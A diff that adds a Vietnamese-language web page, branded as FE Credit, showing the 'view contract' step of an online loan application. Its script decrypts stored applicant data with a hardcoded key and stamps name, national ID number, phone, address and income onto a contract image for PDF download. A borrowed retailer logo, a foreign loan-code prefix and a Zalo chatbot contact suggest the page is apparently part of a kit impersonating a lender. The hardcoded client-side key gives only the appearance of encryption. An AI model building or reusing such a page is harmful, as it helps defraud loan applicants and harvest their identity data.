@@ -1,0 +1,933 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Xem Hợp Đồng - FE Credit</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+    
+    <!-- Mobile UI Enhancement - NEW -->
+    <link rel="stylesheet" href="unified-design-system.css">
+    <link rel="stylesheet" href="mobile-accessibility.css">
+    
+    <!-- Step 1 Style Guide -->
+    <link rel="stylesheet" href="step1-style-guide.css">
+    
+    <style>
+      :root {
+          --primary-color: #2a83e9;
+          --primary-dark: #015C2E;
+          --primary-light: #9FE870;
+          --secondary-color: #f5f6f5;
+          --accent-color: #9FE870;
+      }
+      body {
+          font-family: 'Roboto', sans-serif;
+          font-size: 16px;
+          background-color: var(--secondary-color);
+          margin: 0;
+      }
+      
+      /* FE Credit Header */
+      .fecredit-header {
+        background: #fff !important;
+        border-bottom: 1px solid #ECECEC;
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        padding: 15px 0;
+      }
+      
+      .fecredit-header .container-header {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 15px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      
+      .fecredit-header img {
+        height: 40px;
+        max-width: 200px;
+        object-fit: contain;
+      }
+      
+      .header-icons {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+      .header-icons i {
+        font-size: 24px;
+        cursor: pointer;
+        color: #2a83e9;
+        transition: color 0.3s;
+      }
+      .header-icons i:hover {
+        color: var(--primary-light);
+      }
+
+      .container-main {
+          max-width: 90%;
+          width: 100%;
+          margin: 0 auto;
+          padding: 25px;
+          background: white;
+          border-radius: 8px;
+          box-shadow: 0 0 10px rgba(0,0,0,0.1);
+          position: relative;
+      }
+      @media (min-width: 768px) {
+          .container-main {
+              max-width: 700px;
+              margin: 20px auto;
+          }
+      }
+      .nav-tabs {
+          display: flex;
+          justify-content: space-around;
+          margin-bottom: 25px;
+          margin-top: 0;
+          flex-wrap: nowrap;
+          overflow-x: auto;
+          white-space: nowrap;
+          -webkit-overflow-scrolling: touch;
+      }
+      .nav-tabs .nav-item {
+          flex: 1;
+          text-align: center;
+      }
+      .nav-tabs .nav-link {
+          background-color: #d3d3d3;
+          color: #ffffff;
+          border-radius: 20px;
+          padding: 8px 16px;
+          font-weight: 500;
+          font-size: 14px;
+          width: 100%;
+          margin: 0 5px;
+          transition: background-color 0.3s;
+      }
+      .nav-tabs .nav-link.active {
+          background-color: var(--primary-color);
+          color: #ffffff;
+      }
+      .nav-tabs .nav-link:hover {
+          background-color: var(--primary-light);
+          color: var(--primary-dark);
+      }
+      @media (max-width: 767px) {
+          .nav-tabs .nav-link {
+              font-size: 10px;
+              padding: 6px 8px;
+          }
+          .container-main {
+              max-width: 100% !important;
+              width: 100% !important;
+              padding: 12px !important;
+              margin: 0 !important;
+          }
+      }
+      .step-title {
+          color: var(--primary-color);
+          font-size: 18px;
+          font-weight: 700;
+          margin-bottom: 20px;
+          text-transform: uppercase;
+          text-align: center;
+      }
+      .step-description {
+          font-size: 14px;
+          text-align: center;
+          margin-bottom: 20px;
+          color: #1a3c87;
+      }
+      .image-section {
+          text-align: center;
+          margin: 20px 0;
+      }
+      .canvas-container {
+          position: relative;
+          margin: 20px auto;
+          max-width: 100%;
+          width: 100%;
+          overflow-x: auto;
+          -webkit-overflow-scrolling: touch;
+      }
+      
+      #contractCanvas {
+          width: 100%;
+          max-width: 100%;
+          height: auto;
+          display: block;
+          border: 2px solid #e9ecef;
+          border-radius: 8px;
+          image-rendering: -webkit-optimize-contrast;
+          image-rendering: crisp-edges;
+      }
+      
+      @media (max-width: 768px) {
+          .canvas-container {
+              margin: 10px 0;
+              padding: 0 10px;
+          }
+          
+          #contractCanvas {
+              max-width: calc(100vw - 40px);
+              border-radius: 4px;
+          }
+      }
+      #contractCanvas.loading {
+          opacity: 0.5;
+          background: rgba(248, 249, 250, 0.9);
+      }
+      .btn-download {
+          background-color: #17a2b8;
+          color: white;
+          font-size: 14px;
+          font-weight: 700;
+          padding: 10px 20px;
+          border-radius: 20px;
+          transition: all 0.3s ease;
+      }
+      .btn-download:hover {
+          background-color: var(--primary-color);
+      }
+      .btn-primary {
+          background-color: var(--primary-color);
+          border: none;
+          border-radius: 20px;
+          padding: 10px 20px;
+          font-weight: 700;
+          font-size: 14px;
+          transition: all 0.3s ease;
+          margin: 5px;
+      }
+      .btn-primary:hover {
+          background-color: var(--primary-dark);
+          box-shadow: 0 4px 12px rgba(0, 153, 79, 0.3);
+      }
+      .btn-secondary {
+          background-color: #6c757d;
+          color: white;
+          border: none;
+          border-radius: 20px;
+          padding: 10px 20px;
+          font-weight: 700;
+          font-size: 14px;
+          transition: all 0.3s ease;
+          margin: 5px;
+      }
+      .btn-secondary:hover {
+          background-color: #5a6268;
+      }
+      .footer {
+          text-align: center;
+          padding: 20px;
+          background-color: var(--primary-color);
+          color: white;
+          margin-top: 20px;
+          font-size: 12px;
+      }
+      .footer-links a {
+          color: #b3cde0;
+          margin: 0 10px;
+          text-decoration: none;
+          transition: color 0.3s;
+      }
+      .footer-links a:hover {
+          color: var(--primary-light);
+      }
+      .button-group {
+          display: flex;
+          justify-content: center;
+          gap: 15px;
+          margin-top: 15px;
+          flex-wrap: wrap;
+      }
+      @media (max-width: 767px) {
+          .button-group {
+              flex-direction: row;
+              justify-content: center;
+              flex-wrap: nowrap;
+          }
+          .button-group a, .button-group button {
+              flex: 1;
+              text-align: center;
+              padding: 8px 10px;
+              font-size: 12px;
+          }
+      }
+      .divider-blue {
+          border-top: 1px solid #b3cde0;
+          margin: 15px 0;
+      }
+      .error-message {
+          color: #ff4d4f;
+          font-size: 14px;
+          font-weight: 500;
+          text-align: center;
+          margin-top: 5px;
+          padding: 6px;
+          background-color: #ffe6e6;
+          border-radius: 5px;
+          display: none;
+      }
+      .canvas-loading-overlay {
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: rgba(255, 255, 255, 0.95);
+          padding: 20px 30px;
+          border-radius: 8px;
+          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+          display: none;
+          z-index: 10;
+      }
+      .canvas-loading-overlay.show {
+          display: block;
+      }
+      .spinner {
+          border: 3px solid #f3f3f3;
+          border-top: 3px solid #2a83e9;
+          border-radius: 50%;
+          width: 30px;
+          height: 30px;
+          animation: spin 1s linear infinite;
+          margin: 0 auto 10px;
+      }
+      @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+      }
+      .btn-download .spinner-small {
+          display: inline-block;
+          width: 14px;
+          height: 14px;
+          border: 2px solid #ffffff;
+          border-top: 2px solid transparent;
+          border-radius: 50%;
+          animation: spin 0.8s linear infinite;
+          margin-right: 8px;
+          vertical-align: middle;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- FE Credit Header -->
+    <header class="fecredit-header">
+      <div class="container-header">
+        <div style="flex: 0 0 auto;">
+          <a href="../index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" style="display: flex; align-items: center; text-decoration: none;">
+            <img src="https://thuvienvector.vn/wp-content/uploads/2025/08/dien-may-xanh-logo-png.jpg" 
+                 alt="FE CREDIT - Ngân hàng tài chính tiêu dùng hàng đầu Việt Nam" 
+                 style="object-fit: contain; height: 40px; max-width: 200px;"
+                 width="150"
+                 height="40">
+            <span style="margin-left: 10px; font-size: 14px; font-weight: 600; color: #2a83e9; display: none;" class="logo-text">
+              FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP
+            </span>
+          </a>
+        </div>
+        <div class="header-icons">
+          <i class="bi bi-search"></i>
+          <div class="dropdown">
+            <i
+              class="bi bi-list"
+              data-bs-toggle="dropdown"
+              aria-expanded="false"
+            ></i>
+            <ul class="dropdown-menu dropdown-menu-end">
+              <li>
+                <a class="dropdown-item" href="loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a>
+              </li>
+              <li>
+                <a class="dropdown-item" href="#footer">LIÊN HỆ</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </header>
+    
+    <hr class="divider-blue" style="margin: 0" />
+
+    <div class="container-main">
+      <!-- Tabs -->
+      <ul class="nav nav-tabs">
+        <li class="nav-item">
+          <a class="nav-link" href="step1.html">1. Nhập thông tin</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="step4.html">2. Xác thực và xử lý</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link active" href="step6.html">3. Hoàn thành</a>
+        </li>
+      </ul>
+
+      <div id="step6" class="step-transition">
+        <h5 class="step-title">Xem Hợp Đồng</h5>
+        <div class="error-message" id="formError"></div>
+        <p class="step-description">
+          Dưới đây là hợp đồng vay tín chấp của bạn. Vui lòng kiểm tra kỹ thông tin.
+        </p>
+        <div class="image-section">
+          <div class="canvas-container">
+            <div class="canvas-loading-overlay" id="canvasLoadingOverlay">
+              <div class="spinner"></div>
+              <div style="text-align: center; color: #2a83e9; font-weight: 500;">Đang tải hợp đồng...</div>
+            </div>
+            <canvas id="contractCanvas"></canvas>
+          </div>
+        </div>
+        <hr class="divider-blue" />
+        <div class="button-group">
+          <!-- Quay lại đúng step5 -->
+          <a href="step5.html" class="btn btn-secondary">QUAY LẠI</a>
+          <!-- Tải xuống PDF từ canvas -->
+          <button id="downloadContractBtn" class="btn btn-download" disabled>
+            TẢI XUỐNG
+          </button>
+          <!-- Tiếp tục sang step7 -->
+          <button
+            id="proceedToStep7Btn"
+            type="button"
+            class="btn btn-primary"
+            data-next-url="step7.html"
+          >
+            TIẾP TỤC
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer" id="footer">
+      <div class="footer-links">
+        <a href="chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+        <a href="dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
+        <a href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan"
+          >Liên hệ</a
+        >
+      </div>
+      <p class="mt-3">© 2025 FE CREDIT BANK VIETNAM ALL RIGHTS RESERVED.</p>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script>
+      // =====================================================================
+      // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+      // =====================================================================
+      // Lưu vị trí hiện tại ngay khi trang tải
+      localStorage.setItem('currentStep', 'step6.html');
+
+      // =====================================================================
+      // STEP 6: HỢP ĐỒNG VAY - BUSINESS LOGIC (PRODUCTION VERSION)
+      // =====================================================================
+      
+      const SECRET_KEY = "fecredit-secret-key-v1"; // Unified encryption key across all steps
+      const CONTRACT_IMAGE_URL = "/assets/img/anhhopdongvay.png"; // Absolute URL for deployment
+      const DEFAULT_LOAN_TYPE = "Vay tiêu dùng tín chấp";
+      
+      let userData = {};
+      
+      // =====================================================================
+      // UTILITY FUNCTIONS
+      // =====================================================================
+      
+      /**
+       * Load và giải mã userData từ localStorage
+       */
+      function loadUserData() {
+        try {
+          const encryptedData = localStorage.getItem("userData");
+          if (!encryptedData) {
+            console.error("Không tìm thấy dữ liệu trong localStorage");
+            showError("Không tìm thấy thông tin đăng ký. Vui lòng quay lại Bước 1.");
+            showBackToStep1Button();
+            return false;
+          }
+          
+          const decryptedBytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
+          const decryptedText = decryptedBytes.toString(CryptoJS.enc.Utf8);
+          
+          if (!decryptedText) {
+            console.error("Giải mã thất bại");
+            showError("Không thể đọc dữ liệu. Vui lòng quay lại Bước 1.");
+            showBackToStep1Button();
+            return false;
+          }
+          
+          userData = JSON.parse(decryptedText);
+          
+          // Kiểm tra dữ liệu cần thiết
+          if (!userData.fullName) {
+            console.error("Dữ liệu không hợp lệ - thiếu thông tin bắt buộc");
+            showError("Thông tin không đầy đủ. Vui lòng quay lại Bước 1.");
+            showBackToStep1Button();
+            return false;
+          }
+          
+          return true;
+        } catch (error) {
+          console.error("Lỗi giải mã dữ liệu:", error);
+          showError("Lỗi đọc dữ liệu: " + error.message + ". Vui lòng quay lại Bước 1.");
+          showBackToStep1Button();
+          return false;
+        }
+      }
+      
+      /**
+       * Hiển thị nút quay về Step 1 khi có lỗi
+       */
+      function showBackToStep1Button() {
+        const buttonGroup = document.querySelector('.button-group');
+        if (buttonGroup) {
+          buttonGroup.innerHTML = '<a href="step1.html" class="btn btn-primary">QUAY VỀ BƯỚC 1</a>';
+        }
+      }
+      
+      /**
+       * Lưu userData vào localStorage (có mã hóa)
+       */
+      function saveUserData() {
+        try {
+          const encryptedData = CryptoJS.AES.encrypt(
+            JSON.stringify(userData),
+            SECRET_KEY
+          ).toString();
+          localStorage.setItem("userData", encryptedData);
+          return true;
+        } catch (error) {
+          console.error("Lỗi lưu dữ liệu:", error);
+          showError("Lỗi lưu dữ liệu. Vui lòng thử lại.");
+          return false;
+        }
+      }
+      
+      /**
+       * Hiển thị thông báo lỗi
+       */
+      function showError(message) {
+        const errorElement = $("#formError");
+        errorElement.css({
+          "background-color": "#ffe6e6",
+          "color": "#ff4d4f"
+        }).text(message).show();
+      }
+      
+      /**
+       * Ẩn thông báo lỗi
+       */
+      function hideError() {
+        $("#formError").hide().text("");
+      }
+      
+      /**
+       * Hiển thị thông báo thành công
+       */
+      function showSuccess(message) {
+        const errorElement = $("#formError");
+        errorElement.css({
+          "background-color": "#d4edda",
+          "color": "#155724"
+        }).text(message).show();
+        
+        // Tự động ẩn sau 3 giây
+        setTimeout(() => {
+          errorElement.css({
+            "background-color": "#ffe6e6",
+            "color": "#ff4d4f"
+          }).hide();
+        }, 3000);
+      }
+      
+      /**
+       * Disable các nút action
+       */
+      function disableButtons() {
+        $("#downloadContractBtn").prop("disabled", true);
+        // Không disable nút tiếp tục nữa
+      }
+      
+      /**
+       * Enable nút download
+       */
+      function enableDownloadButton() {
+        $("#downloadContractBtn").prop("disabled", false);
+      }
+      
+      /**
+       * Enable nút tiếp tục (không cần gọi, đã enable sẵn)
+       */
+      function enableProceedButton() {
+        $("#proceedToStep7Btn").prop("disabled", false);
+      }
+      
+      /**
+       * Hiển thị loading overlay trên canvas
+       */
+      function showCanvasLoading() {
+        $("#canvasLoadingOverlay").addClass("show");
+      }
+      
+      /**
+       * Ẩn loading overlay trên canvas
+       */
+      function hideCanvasLoading() {
+        $("#canvasLoadingOverlay").removeClass("show");
+      }
+      
+      // =====================================================================
+      // CANVAS RENDERING
+      // =====================================================================
+      
+      /**
+       * Render hình ảnh hợp đồng vào canvas
+       */
+      function renderContractCanvas() {
+        const canvas = document.getElementById("contractCanvas");
+        if (!canvas) {
+          showError("Không tìm thấy khu vực hiển thị hợp đồng.");
+          return;
+        }
+        
+        // Check browser support for Canvas
+        if (!canvas.getContext) {
+          showError("Trình duyệt không hỗ trợ Canvas. Vui lòng nâng cấp trình duyệt.");
+          // Disable buttons to prevent further errors
+          const downloadBtn = document.getElementById("downloadContractBtn");
+          const proceedBtn = document.getElementById("proceedToStep7Btn");
+          if (downloadBtn) downloadBtn.disabled = true;
+          if (proceedBtn) proceedBtn.disabled = true;
+          return;
+        }
+        
+        const ctx = canvas.getContext("2d");
+        const image = new Image();
+        
+        // Hiển thị loading
+        showCanvasLoading();
+        canvas.classList.add("loading");
+        
+        image.onload = function() {
+          hideCanvasLoading();
+          canvas.classList.remove("loading");
+          
+          // Set canvas size - Updated to new dimensions
+          canvas.width = 595;
+          canvas.height = 844;
+          
+          // Draw image
+          ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+          
+          // Draw user data on canvas
+          drawUserDataOnCanvas(ctx);
+          
+          // Enable download button khi canvas load xong
+          enableDownloadButton();
+          
+          // Nếu đã tải trước đó, enable luôn nút tiếp tục
+          if (userData.isContractDownloaded) {
+            enableProceedButton();
+          }
+        };
+        
+        image.onerror = function() {
+          hideCanvasLoading();
+          canvas.classList.remove("loading");
+          console.error("Image failed to load from:", CONTRACT_IMAGE_URL);
+          showError("Không thể tải hình ảnh hợp đồng. Vui lòng thử lại sau.");
+          disableButtons();
+        };
+        
+        image.src = CONTRACT_IMAGE_URL;
+      }
+      
+      /**
+       * Vẽ thông tin người dùng lên canvas
+       */
+      function drawUserDataOnCanvas(ctx) {
+        // Helper functions
+        function formatNumber(number) {
+          if (!number || number === "N/A" || number === 0) return "";
+          return Number(Math.floor(number)).toLocaleString("vi-VN");
+        }
+        
+        function formatCurrency(amount) {
+          if (!amount || amount === "N/A" || amount === 0) return "";
+          return formatNumber(amount) + " VNĐ";
+        }
+        
+        function getTodayFormatted() {
+          const today = new Date();
+          const day = String(today.getDate()).padStart(2, '0');
+          const month = String(today.getMonth() + 1).padStart(2, '0');
+          const year = today.getFullYear();
+          return `${day}/${month}/${year}`;
+        }
+        
+        function calculateDueDatePlusOneMonth(dateStr) {
+          if (!dateStr) {
+            // Nếu không có ngày đăng ký, dùng ngày hôm nay
+            const today = new Date();
+            today.setMonth(today.getMonth() + 1);
+            const day = String(today.getDate()).padStart(2, '0');
+            const month = String(today.getMonth() + 1).padStart(2, '0');
+            const year = today.getFullYear();
+            return `${day}/${month}/${year}`;
+          }
+          
+          let date;
+          if (/^\d{2}\/\d{2}\/\d{4}$/.test(dateStr)) {
+            const [d, m, y] = dateStr.split("/");
+            date = new Date(y, m - 1, d);
+          } else if (/^\d{4}-\d{2}-\d{2}$/.test(dateStr)) {
+            date = new Date(dateStr);
+          } else {
+            return "";
+          }
+          
+          if (isNaN(date.getTime())) return "";
+          date.setMonth(date.getMonth() + 1);
+          if (isNaN(date.getTime())) return "";
+          
+          const day = String(date.getDate()).padStart(2, '0');
+          const month = String(date.getMonth() + 1).padStart(2, '0');
+          const year = date.getFullYear();
+          return `${day}/${month}/${year}`;
+        }
+        
+        // Lấy dữ liệu ngày tháng từ userData
+        // Ngày cấp CCCD - KHÔNG có trong step1 hoặc step2, để trống
+        const idIssueDateParts = { day: "", month: "", year: "" };
+        
+        // Ngày đăng ký = ngày hôm nay
+        const todayStr = getTodayFormatted();
+        
+        // Ngày đến hạn = ngày đăng ký + 1 tháng
+        const dueDateStr = calculateDueDatePlusOneMonth(todayStr);
+        
+        // Canvas fields configuration với tọa độ theo yêu cầu (595x844px)
+        // Font size 10-12px, màu đen #000000, font Arial
+        const fields = [
+          // Họ và tên (từ step1: fullName)
+          { value: userData.fullName || "", x: 155, y: 141, font: "bold 12px Arial", color: "#000000" },
+          
+          // Ngày sinh (từ step1: dob format DD/MM/YYYY)
+          { value: userData.dob || "", x: 475, y: 138, font: "10px Arial", color: "#000000" },
+          
+          // Số CMND/CCCD (từ step1: cccd)
+          { value: userData.cccd || "", x: 101, y: 168, font: "bold 11px Arial", color: "#000000" },
+          
+          // Ngày cấp CMND (KHÔNG có trong step1/step2 - để trống)
+          { value: idIssueDateParts.day, x: 284, y: 163, font: "10px Arial", color: "#000000" },
+          
+          // Tháng cấp CMND (KHÔNG có trong step1/step2 - để trống)
+          { value: idIssueDateParts.month, x: 314, y: 160, font: "10px Arial", color: "#000000" },
+          
+          // Năm cấp CMND (KHÔNG có trong step1/step2 - để trống)
+          { value: idIssueDateParts.year, x: 339, y: 161, font: "10px Arial", color: "#000000" },
+          
+          // Số điện thoại (từ step1: phone)
+          { value: userData.phone || "", x: 98, y: 208, font: "bold 11px Arial", color: "#000000" },
+          
+          // Địa chỉ hiện tại (từ step1: contactAddress)
+          { value: userData.contactAddress || "", x: 219, y: 239, font: "10px Arial", color: "#000000" },
+          
+          // Email (từ step1: email)
+          { value: userData.email || "", x: 120, y: 253, font: "10px Arial", color: "#000000" },
+          
+          // Thu nhập hàng tháng (từ step2: monthlyIncome - format VNĐ)
+          { value: formatCurrency(userData.monthlyIncome), x: 159, y: 433, font: "11px Arial", color: "#000000" },
+          
+          // Tên người thân (KHÔNG có trong step1/step2 - để trống)
+          { value: "", x: 106, y: 474, font: "11px Arial", color: "#000000" },
+          
+          // Số điện thoại người thân (KHÔNG có trong step1/step2 - để trống)
+          { value: "", x: 455, y: 473, font: "10px Arial", color: "#000000" },
+          
+          // Họ và tên (Ký tên) - giống họ tên ở trên (từ step1: fullName)
+          { value: userData.fullName || "", x: 145, y: 559, font: "bold 11px Arial", color: "#000000" },
+          
+          // Ngày đăng ký (Today)
+          { value: todayStr, x: 99, y: 574, font: "10px Arial", color: "#000000" },
+          
+          // Ngày đến hạn (Ngày đăng ký + 1 tháng)
+          { value: dueDateStr, x: 385, y: 575, font: "10px Arial", color: "#000000" },
+          
+          // Số tiền vay dòng 1 (từ step2: loanAmount - format VNĐ)
+          { value: formatCurrency(userData.loanAmount), x: 273, y: 587, font: "bold 11px Arial", color: "#000000" },
+          
+          // Số tiền đóng hàng tháng (từ step2: monthlyPayment - đã tính sẵn)
+          { value: formatCurrency(userData.monthlyPayment), x: 212, y: 600, font: "11px Arial", color: "#000000" },
+          
+          // Số tiền vay dòng 2 (từ step2: loanAmount - format VNĐ)
+          { value: formatCurrency(userData.loanAmount), x: 325, y: 725, font: "bold 11px Arial", color: "#000000" },
+          
+          // Số tiền đề nghị vay (giống số tiền vay)
+          { value: formatCurrency(userData.loanAmount), x: 161, y: 742, font: "bold 11px Arial", color: "#000000" },
+          
+          // Hình thức vay (Hardcode theo yêu cầu)
+          { value: DEFAULT_LOAN_TYPE, x: 165, y: 784, font: "10px Arial", color: "#000000" }
+        ];
+        
+        // Draw all fields
+        fields.forEach(field => {
+          if (field.value && field.x >= 0 && field.y >= 0) {
+            ctx.font = field.font;
+            ctx.fillStyle = field.color;
+            ctx.fillText(field.value, field.x, field.y);
+          }
+        });
+      }
+      
+      // =====================================================================
+      // PDF DOWNLOAD
+      // =====================================================================
+      
+      /**
+       * Tải xuống canvas dưới dạng PDF
+       */
+      function downloadContractAsPDF() {
+        const canvas = document.getElementById("contractCanvas");
+        const btn = $("#downloadContractBtn");
+        
+        if (!canvas || !canvas.width || !canvas.height) {
+          showError("Hợp đồng chưa sẵn sàng để tải xuống. Vui lòng thử lại.");
+          return;
+        }
+        
+        try {
+          // Hiển thị loading trên nút
+          const originalText = btn.html();
+          btn.prop("disabled", true);
+          btn.html('<span class="spinner-small"></span>ĐANG TẢI...');
+          
+          // Kiểm tra jsPDF library
+          if (!window.jspdf || typeof window.jspdf.jsPDF !== "function") {
+            throw new Error("Thư viện jsPDF chưa được tải");
+          }
+          
+          const { jsPDF } = window.jspdf;
+          
+          // Tạo PDF
+          const pdf = new jsPDF({
+            orientation: "p",
+            unit: "px",
+            format: [canvas.width, canvas.height]
+          });
+          
+          // Thêm canvas vào PDF
+          pdf.addImage(
+            canvas.toDataURL("image/png", 1.0),
+            "PNG",
+            0,
+            0,
+            canvas.width,
+            canvas.height
+          );
+          
+          // Tạo tên file
+          const loanCode = (userData.loanCode || "SHBVN000000").replace(/[^a-zA-Z0-9_-]/g, "");
+          const fileName = `HopDongVay_${loanCode}.pdf`;
+          
+          // Lưu PDF
+          pdf.save(fileName);
+          
+          // Cập nhật userData
+          userData.isContractDownloaded = true;
+          userData.contractDownloadedAt = new Date().toISOString();
+          
+          // Lưu vào localStorage
+          if (saveUserData()) {
+            showSuccess("Hợp đồng đã được tải xuống thành công!");
+            enableProceedButton();
+          }
+          
+          // Khôi phục nút
+          btn.prop("disabled", false);
+          btn.html(originalText);
+          
+        } catch (error) {
+          console.error("Lỗi tải PDF:", error);
+          showError("Không thể tải hợp đồng. Lỗi: " + error.message);
+          
+          // Khôi phục nút
+          btn.prop("disabled", false);
+          btn.html("TẢI XUỐNG");
+        }
+      }
+      
+      // =====================================================================
+      // NAVIGATION
+      // =====================================================================
+      
+      /**
+       * Kiểm tra và chuyển sang step 7
+       */
+      function proceedToStep7() {
+        // Cập nhật currentStep
+        userData.currentStep = 7;
+        userData.lastStep6CompletedAt = new Date().toISOString();
+        
+        // Lưu và chuyển trang
+        if (saveUserData()) {
+          window.location.href = "step7.html";
+        }
+      }
+      
+      // =====================================================================
+      // INITIALIZATION
+      // =====================================================================
+      
+      $(document).ready(function() {
+        // Disable buttons ban đầu
+        disableButtons();
+        
+        // Load userData - nếu thất bại sẽ hiển thị lỗi và nút quay về step1
+        const loaded = loadUserData();
+        if (!loaded) {
+          // Không render canvas nếu không có dữ liệu
+          return;
+        }
+        
+        // Render canvas với dữ liệu thật
+        renderContractCanvas();
+        
+        // Event handlers
+        $("#downloadContractBtn").on("click", function() {
+          if (!$(this).prop("disabled")) {
+            downloadContractAsPDF();
+          }
+        });
+        
+        $("#proceedToStep7Btn").on("click", function() {
+          if (!$(this).prop("disabled")) {
+            proceedToStep7();
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
+
+
